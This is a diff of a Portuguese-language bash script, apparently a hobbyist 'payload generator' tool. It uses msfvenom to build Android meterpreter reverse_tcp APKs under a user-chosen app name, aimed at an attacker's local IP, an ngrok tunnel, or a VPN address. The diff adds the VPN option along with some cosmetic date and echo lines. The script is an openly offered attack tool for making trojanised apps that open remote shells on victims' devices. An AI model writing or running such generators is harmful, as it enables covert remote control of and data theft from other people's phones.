@@ -11,7 +11,7 @@ PRETO="\033[30m"
 CLARO="\033[33m"
 
 #   CORES
-
+echo -e "${RED}"
 figlet  "GERADOR"
 
 echo "*---------------------------------------------------*"
@@ -19,7 +19,7 @@ echo "*[*]SEJA BEM VINDO AO GERADOR DE PAYLOAD[*]         *"
 echo "               [*]create by:paulo(killercrown)[*]      "
 echo "               [*]atualizado:26/02/2018 as 13:42[*]"
 echo "*---------------------------------------------------*"
-echo
+date
 echo -e "${CYAN}*******************************************************************************"
 echo -e "${RED}** [1]- REDE INTERNA  **"   "${PRETO} ***ANDROID***                            "
 echo -e "${RED}** [2]- REDE EXTERNA  **"  "${PRETO}  ***ANDROID***                           " 
@@ -50,6 +50,8 @@ read apk
 WHITE="\033[01;37m"
 CLARO="\033[33m"
 PRETO="\033[30m"
+echo "voce usou isso em " 
+date
 echo -e "${CLARO}CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$interno  LPORT=$porta R > $apk.apk
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
@@ -71,6 +73,26 @@ sleep 3
 clear
 echo -e "${RED}[-]WARNING: ESTA OPCAO VAI FUCIONAR COM O SERVICO NGROK[-]"
 echo -e "${CLARO}[+]LIGUE O NGROK USANDO: NGROK TCP 4444(OU OUTRA PORTA)"
+sleep 4
+clear
+echo -e "${RED}[-]VAI USAR VPN OU NGROK? [-]"
+read resposta
+if [ "$resposta" == "VPN" ]
+then
+echo -e "${CYAN}informe o ip da vpn"
+read vpn
+echo "informe a porta"
+read pporta
+echo "informe o nome do aplicativo"
+read appk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$vpn LPORT=$pporta R > $appk.apk
+echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDO..."
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
+echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+
+else
 echo -e "${CLARO}[+]INFORME A PORTA QUE O NGROK GEROU"
 read port
 echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
@@ -80,6 +102,5 @@ echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 fi
-
-
+fi
 
